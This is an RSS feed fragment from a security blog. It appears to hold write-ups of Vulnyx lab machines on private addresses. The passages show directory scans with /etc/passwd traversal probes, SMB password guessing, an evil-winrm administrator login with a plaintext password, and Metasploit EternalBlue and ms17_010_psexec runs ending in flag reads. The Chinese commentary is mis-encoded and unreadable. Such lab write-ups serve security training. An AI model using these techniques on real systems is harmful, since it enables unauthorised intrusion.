/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/vulnyx/Hosting/reports/http_192.168.56.21/_speed_24-12-23_04-02-31.txt

Target: http://192.168.56.21/

[04:02:31] Starting: speed/
[04:02:31] 301 -  164B  - /speed/js  -&gt;  http://192.168.56.21/speed/js/
[04:02:31] 403 -  312B  - /speed/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:02:33] 403 -  312B  - /speed/\..\..\..\..\..\..\..\..\..\etc\passwd
[04:02:37] 403 -  312B  - /speed/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[04:02:38] 301 -  165B  - /speed/css  -&gt;  http://192.168.56.21/speed/css/
[04:02:40] 301 -  167B  - /speed/fonts  -&gt;  http://192.168.56.21/speed/fonts/
[04:02:41] 301 -  168B  - /speed/images  -&gt;  http://192.168.56.21/speed/images/
[04:02:41] 403 -    1KB - /speed/images/
[04:02:41] 403 -    1KB - /speed/js/

Task Completed

<br>è®¿é—®åæŸ¥çœ‹æºç æ²¡æœ‰æ„Ÿè§‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ç›´æ¥åˆ©ç”¨çš„ç‚¹æˆ–è€…éšè—çš„æç¤ºä¿¡æ¯<br>
<img alt="assets/Pasted image 20241223170417.png" src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223170417.png"><br>
åœ¨è¿™é‡Œå¯ä»¥è·å–åˆ°4ä¸ªäººå<br>
æˆ‘ä»¬å°†å®ƒå†™å…¥å­—å…¸<br>æˆ‘é¶æœºç°åœ¨æœ‰é—®é¢˜ã€‚ä½¿ç”¨æ­£ç¡®çš„è´¦å·å¯†ç æ— æ³•ç™»å½•]]></description><link>https://www.c1trus.top/24-æ¸—é€/vulnyx/4.hosting.html</link><guid isPermaLink="false">24-æ¸—é€/Vulnyx/4.Hosting.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223165928.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223165928.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[3.Admin]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç›®å½•æ‰«æ" data-href="#2.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç›®å½•æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. smbç©ºä¼šè¯æ£€æµ‹" data-href="#2.2. smbç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#2.2._smbç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">2.2. smbç©ºä¼šè¯æ£€æµ‹</a>


<br><a data-tooltip-position="top" aria-label="3. smbçˆ†ç ´" data-href="#3. smbçˆ†ç ´" href="https://www.c1trus.top/about:blank#3._smbçˆ†ç ´" class="internal-link" target="_self" rel="noopener nofollow">3. smbçˆ†ç ´</a>
<br><a data-tooltip-position="top" aria-label="4. ææƒ" data-href="#4. ææƒ" href="https://www.c1trus.top/about:blank#4._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒ</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸ï¸
<br><br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Admin]
â””â”€# nmap -sCV 192.168.56.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 23:28 EST
Nmap scan report for 192.168.56.20
Host is up (0.00076s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:5E:A6:CF (Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:5e:a6:cf (Oracle VirtualBox virtual NIC)
|_clock-skew: 6h59m58s
| smb2-time:
|   date: 2024-12-23T11:28:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds


<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Admin]
â””â”€# gobuster dir -u http://192.168.56.20/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.20/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/tasks.txt            (Status: 200) [Size: 98]
/Tasks.txt            (Status: 200) [Size: 98]


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Admin]
â””â”€# curl http://192.168.56.20/tasks.txt
Pending tasks:

 - Finish website
 - Update OS
 - Drink coffee
 - Rest
 - Change password

By hope 
<br>è·å–åˆ°äº†ä¸€ä¸ªç”¨æˆ·å hope<br><br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Admin]
â””â”€# smbmap -H 192.168.56.20 -u guest -p ' '

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                                         [*] Detected 1 hosts serving SMB
[|] Initializing hosts...                                                                              [/] Authenticating...                                                                                  [-] Authenticating...                                                                                  [\] Authenticating...                                                                                  [*] Established 1 SMB connections(s) and 0 authenticated session(s)
[|] Closing connections..                                                                              [/] Closing connections..                                                                              [-] Closing connections..                                                                              [*] Closed 1 connections

<br>çœ‹æ¥ä¸å­˜åœ¨<br><br>æ—¢ç„¶è·å–åˆ°äº†ç”¨æˆ·å<br>
é‚£ä¹ˆå¯ä»¥å°è¯•è¿›è¡Œçˆ†ç ´<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Admin]
â””â”€# crackmapexec smb 192.168.56.20 -u 'hope' -p 'loser'
SMB         192.168.56.20   445    ADMIN            [*] Windows 10 / Server 2019 Build 19041 x64 (name:ADMIN) (domain:ADMIN) (signing:False) (SMBv1:False)
SMB         192.168.56.20   445    ADMIN            [-] ADMIN\hope:loser STATUS_ACCOUNT_LOCKED_OUT

<br>Warning
è¿™é‡Œæ­£å¸¸æ˜¯å¯ä»¥çˆ†ç ´å‡ºHopeç”¨æˆ·çš„å¯†ç  loser<br>
ä½†æ˜¯æˆ‘é¶æœºå¯èƒ½å‡ºé—®é¢˜äº† ç”¨è¿™ä¸ªå¯†ç ç™»å½•ä¸ä¸Šå»ã€‚ è¯•äº†ä¸‹çˆ†ç ´å…¶ä»–çš„å¯†ç  ä½†æ˜¯çˆ†ç ´ä¸äº†
<br><br>è¿™é‡Œç”±äºæˆ‘Hopeç”¨æˆ·æ— æ³•ç™»å½•ï¼Œæ‰€ä»¥æ— æ³•å®Œæˆã€‚ç›´æ¥çœ‹çš„wp<br>
<a rel="noopener nofollow" class="external-link" href="https://d4t4s3c.medium.com/vulnyx-admin-walkthrough-66fc5891bec0" target="_blank">https://d4t4s3c.medium.com/vulnyx-admin-walkthrough-66fc5891bec0</a><br>
winrmä¸Šå»å<br>
åˆ©ç”¨ winpeasæ£€æµ‹ å¯ä»¥è·å–åˆ°ç®¡ç†å‘˜çš„æ‰§è¡ŒPowershellçš„å†å²è®°å½•<br>
é‡Œé¢æœ‰ä»–çš„è´¦å·å¯†ç <br><img alt="assets/Pasted image 20241223125754.png" src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223125754.png"><br>ç„¶ååˆ©ç”¨winrmè¿æ¥å»ä¸Šå³å¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Admin]
â””â”€# evil-winrm -i 192.168.56.20 -u administrator -p SuperAdministrator123

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\administrator\Documents&gt; whoami
admin\administrator
*Evil-WinRM* PS C:\Users\administrator\Documents&gt;

]]></description><link>https://www.c1trus.top/24-æ¸—é€/vulnyx/3.admin.html</link><guid isPermaLink="false">24-æ¸—é€/Vulnyx/3.Admin.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223125754.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223125754.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.Eternal]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a><br>
éš¾åº¦ â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/Eternal]
â””â”€# fscan -h 192.168.56.19

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] æ‰«æç±»å‹: all, ç›®æ ‡ç«¯å£: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] å¼€å§‹ä¿¡æ¯æ‰«æ...
[*] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1
[*] å…±è§£æ 218 ä¸ªæœ‰æ•ˆç«¯å£
[+] ç«¯å£å¼€æ”¾ 192.168.56.19:139
[+] ç«¯å£å¼€æ”¾ 192.168.56.19:445
[+] ç«¯å£å¼€æ”¾ 192.168.56.19:135
[+] å­˜æ´»ç«¯å£æ•°é‡: 3
[*] å¼€å§‹æ¼æ´æ‰«æ...
[!] æ‰«æé”™è¯¯ 192.168.56.19:139 - netbios error
[*] NetInfo
[*] 192.168.56.19
   [-&gt;] MIKE-PC
   [-&gt;] 192.168.56.19
[+] MS17-010 192.168.56.19      (Windows 7 Enterprise 7601 Service Pack 1)
[+] æ‰«æå·²å®Œæˆ: 3/3
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.0239191s

<br><br>msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.56.19
set lhost 192.168.56.6
run

c:\Users\MIKE\Desktop&gt;type root.txt
type root.txt
1682c7160e3855a6685316efb97ce451

c:\Users\MIKE\Desktop&gt;type user.txt
type user.txt
c4fa8bfbc9855acfced6a56a7da3156e
]]></description><link>https://www.c1trus.top/24-æ¸—é€/vulnyx/2.eternal.html</link><guid isPermaLink="false">24-æ¸—é€/Vulnyx/2.Eternal.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[1.Experience]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Experience]
â””â”€# fscan -h 192.168.56.17

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] æ‰«æç±»å‹: all, ç›®æ ‡ç«¯å£: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] å¼€å§‹ä¿¡æ¯æ‰«æ...
[*] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1
[*] å…±è§£æ 218 ä¸ªæœ‰æ•ˆç«¯å£
[+] ç«¯å£å¼€æ”¾ 192.168.56.17:139
[+] ç«¯å£å¼€æ”¾ 192.168.56.17:445
[+] ç«¯å£å¼€æ”¾ 192.168.56.17:135
[+] å­˜æ´»ç«¯å£æ•°é‡: 3
[*] å¼€å§‹æ¼æ´æ‰«æ...
[!] æ‰«æé”™è¯¯ 192.168.56.17:139 - netbios error
[*] NetInfo
[*] 192.168.56.17
   [-&gt;] experience
   [-&gt;] 192.168.56.17
[+] MS17-010 192.168.56.17      (Windows 5.1)
[+] æ‰«æå·²å®Œæˆ: 3/3
[*] æ‰«æç»“æŸ,è€—æ—¶: 45.275206ms

<br><br>msfconsole
use exploit/windows/smb/ms17_010_psexec
set lhost 192.168.56.6
set rhost 192.168.56.17
run 


C:\Documents and Settings\bill\Desktop&gt;type root.txt
type root.txt
c1d5e7e4efece4a6022c4a4080c8114d

C:\Documents and Settings\bill\Desktop&gt;type user.txt
type user.txt
f9e24c8da0686680decee9e594178a2e

]]></description><link>https://www.c1trus.top/24-æ¸—é€/vulnyx/1.experience.html</link><guid isPermaLink="false">24-æ¸—é€/Vulnyx/1.Experience.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[Home]]></title><description><![CDATA[ 
 <br>continue...<br><br><br><br><br><br><br>....continue]]></description><link>https://www.c1trus.top/40-obsidian/home.html</link><guid isPermaLink="false">40-Obsidian/Home.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 14:39:58 GMT</pubDate></item></channel></rss>